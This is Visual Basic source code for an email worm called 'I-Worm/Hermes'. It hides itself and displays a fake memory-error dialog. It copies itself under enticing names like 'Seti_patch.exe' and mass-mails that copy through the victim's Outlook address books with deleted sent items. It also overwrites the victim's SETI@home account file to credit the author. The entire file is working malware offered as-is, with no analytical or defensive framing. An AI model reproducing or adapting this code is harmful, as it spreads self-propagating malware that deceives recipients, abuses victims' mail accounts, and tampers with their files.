   '[I-Worm/Hermes] by [gl_st0rm]

   Private Declare Function InternetOpen Lib "wininet.dll" Alias "InternetOpenA" (ByVal lpszAgent As String, ByVal dwAccessType As Long, ByVal lpszProxyName As String, ByVal lpszProxyBypass As String, ByVal dwFlags As Long) As Long
   Private Declare Function InternetOpenUrl Lib "wininet.dll" Alias "InternetOpenUrlA" (ByVal hInet As Long, ByVal lpszUrl As String, ByVal lpszHeaders As String, ByVal dwHeadersLength As Long, ByVal dwFlags As Long, ByVal dwContext As Long) As Long
   Private Declare Function InternetCloseHandle Lib "wininet.dll" (ByVal hInet As Long) As Long

   Private Const INTERNET_OPEN_TYPE_PRECONFIG = 0
   Private Const INTERNET_FLAG_RELOAD = &H80000000
   Private Const INTERNET_FLAG_KEEP_CONNECTION = &H400000
   Private Const INTERNET_FLAG_NO_CACHE_WRITE = &H4000000

   Dim sTmp As String
   Dim hInet As Long
   Dim hUrl As Long
   Dim Flags As Long
   Dim url As Variant
   Dim Connect, FileStatus, DoneJet As Boolean
   Dim Outlook, RegEdit, FSO As Object
   Dim DirWin, AttachmentPath, RealAppPath, AppPath, SourceFile, TargetFile, Random_, AppEXEName, _
       User_, FileSpec, ProgramFilesDir

   Private Sub Form_Load()
   On Error Resume Next
   DoneJet = False
   App.TaskVisible = False
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Set DirWin = FSO.GetSpecialFolder(0)
   Set RegEdit = CreateObject("WScript.Shell")
   If DirWin = "" Then DirWin = "C:\Windows" 'some fix
   User_ = RegEdit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
   If User_ = "" Then User_ = "unknown" 'some fix for WinNT/2k
   ProgramFilesDir = RegEdit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If ProgramFilesDir = "" Then ProgramFilesDir = "C:\Program Files" 'some fix
   If RegEdit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Hermes") <> _
                       "...by gl" Then
    Call PlayLoad
    Call Connected                               '...is victim inet ready?
    If Connect = False Then Call Not_Connected   'No!
    Call RealPath                                'Yes! ...let send us :)
   End If
   Call Done
   End Sub

   Private Sub Connected()
      hInet = InternetOpen(App.Title, INTERNET_OPEN_TYPE_PRECONFIG, vbNullString, vbNullString, 0&)
      If hInet Then
         Flags = INTERNET_FLAG_KEEP_CONNECTION Or INTERNET_FLAG_NO_CACHE_WRITE Or INTERNET_FLAG_RELOAD
         hUrl = InternetOpenUrl(hInet, "http://www.seznam.cz", vbNullString, 0, Flags, 0)
         If hUrl Then
            Connect = True
            Call InternetCloseHandle(hUrl)
         Else
            Connect = False
         End If
      End If
      Call InternetCloseHandle(hInet)
   End Sub

   Sub Not_Connected()
   On Error Resume Next
   Dim b, Msg
    Msg = "This program requires more conventional memory" & vbCrLf
    Msg = Msg & "Unload drivers or memory-resident programs that use conventional memory, or increase the value for Minimum Conventional Memory in" & vbCrLf
    Msg = Msg & "the program's Memory properities sheet."
   b = RegEdit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\REM")
   If b > 2 Then Call RealPath
    b = b + 1
    RegEdit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\REM", b
    MsgBox Msg, vbExclamation, App.EXEName
   End
   End Sub

   Sub RealPath()
   AppPath = LCase(App.Path)
    If (AppPath = "c:\") Or (AppPath = "d:\") Or (AppPath = "e:\") Or (AppPath = "f:\") _
     Or (AppPath = "g:\") Or (AppPath = "h:\") Or (AppPath = "i:\") Or (AppPath = "j:\") _
     Or (AppPath = "k:\") Or (AppPath = "l:\") Or (AppPath = "m:\") Or (AppPath = "n:\") _
     Or (AppPath = "o:\") Or (AppPath = "p:\") Or (AppPath = "r:\") Or (AppPath = "q:\") _
     Or (AppPath = "s:\") Or (AppPath = "t:\") Or (AppPath = "u:\") Or (AppPath = "v:\") _
     Or (AppPath = "w:\") Or (AppPath = "x:\") Or (AppPath = "y:\") Or (AppPath = "z:\") _
     Or (AppPath = "a:\") Or (AppPath = "b:\") Then
     RealAppPath = App.Path
    Else: RealAppPath = App.Path & "\"
    End If
   Call AttachName
   End Sub

   Sub AttachName() 'EXE or SCR
   Dim M
   Randomize
   M = Int((20 * Rnd) + 1)
   If M = 1 Then FileName_ = "Seti@home 3.x to 4.0 upd.exe"
   If M = 2 Then FileName_ = "Seti@home_twk.exe"
   If M = 3 Then FileName_ = "Seti_patch.exe"
   If M = 4 Then FileName_ = "Lunetic!.exe"
   If M = 5 Then FileName_ = "CIH.exe"
   If M = 6 Then FileName_ = "Energy.exe"
   If M = 7 Then FileName_ = "ftip.exe"
   If M = 8 Then FileName_ = "Navidat.exe"
   If M = 9 Then FileName_ = "Click_ME!.exe"
   If M = 10 Then FileName_ = "Cenik.exe"
   If M = 11 Then FileName_ = "Lunetic.scr"
   If M = 12 Then FileName_ = "fucking.scr"
   If M = 13 Then FileName_ = "micro$haft.scr"
   If M = 14 Then FileName_ = "matrix.scr"
   If M = 15 Then FileName_ = "reboot.scr"
   If M = 16 Then FileName_ = "Pamela.scr"
   If M = 17 Then FileName_ = "techno.scr"
   If M = 18 Then FileName_ = "funny!.scr"
   If M = 19 Then FileName_ = "Hermes.scr"
   If M = 20 Then FileName_ = "School_in_da_flame.scr"
   On Error Resume Next 'ERROR FIX
   SourceFileEXE = RealAppPath & App.EXEName & ".exe" 'we dont know if actual
   SourceFileSCR = RealAppPath & App.EXEName & ".scr" 'name is .exe or .scr :(
   TargetFile = DirWin & "\" & FileName_
   FileCopy SourceFileEXE, TargetFile
   FileCopy SourceFileSCR, TargetFile
   AttachmentPath = TargetFile
   Call Send
   End Sub

   Sub Send()
   Dim out, User
   On Error Resume Next
   User = User_
   If User = "unknown" Then User = ""
   Set Outlook = CreateObject("Outlook.Application")
   Set MAPI = Outlook.GetNameSpace("MAPI")
       MAPI.Logon "profile", "password"
       For Y = 1 To MAPI.AddressLists.Count
        Set AddyBook = MAPI.AddressLists(Y)
        X = 1
        Set out = Outlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
         Mail = AddyBook.AddressEntries(X)
         out.Recipients.Add Mail
         X = X + 1
         If X > 100 Then oo = AddyBook.AddressEntries.Count
        Next oo
         out.Subject = "RE:"
         out.Body = vbCrLf & "[" & User & "]" & vbCrLf & vbCrLf & vbCrLf
         out.Attachments.Add AttachmentPath
         out.DeleteAfterSubmit = True
         out.Send
         Mail = ""
        Next Y
        MAPI.Logoff
   Call Done
   End Sub

   Sub PlayLoad()
   On Error Resume Next
   FileSpec = LCase(ProgramFilesDir & "\SETI@home\user_info.sah")
   ReportFileStatus (FileSpec)
   If FileStatus = True Then
    Kill ProgramFilesDir & "\SETI@home\temp.sah"
    Open ProgramFilesDir & "\SETI@home\user_info.sah" For Output As #1
    Print #1, "type=user info" & Chr(13) & _
              "id=2199938" & Chr(13) & _
              "key=1603033966" & Chr(13) & _
              "email_addr=gl_storm@seznam.cz" & Chr(13) & _
              "name=" & User_ & Chr(13) & _
              "url=" & Chr(13) & _
              "country=Czech Republic" & Chr(13) & _
              "postal_code=60000" & Chr(13) & _
              "show_name=yes" & Chr(13) & _
              "show_email=yes" & Chr(13) & _
              "venue=1" & Chr(13) & _
              "register_time= 2451754.99955 (Sat Jul 29 11:59:21 2000)" & Chr(13) & _
              "last_wu_time=       0.00000" & Chr(13) & _
              "last_result_time= 2451909.93885 (Sun Dec 31 10:31:56 2000)" & Chr(13) & _
              "nwus=0" & Chr(13) & _
              "nresults=35" & Chr(13) & _
              "total_cpu=1224468.031000" & Chr(13) & _
              "params_index=0" & Chr(13) & Chr(13)
    Close #1
   End If
   End Sub

   Function ReportFileStatus(FileSpec)
    If (FSO.FileExists(FileSpec)) Then
       FileStatus = True
    Else
       FileStatus = False
    End If
   End Function

   Sub Done()
   RegEdit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Hermes", "...by gl"
   MsgBox "Code by:  gl ", vbCritical, "_ i-Worm.Hermes _"
   End
   End Sub
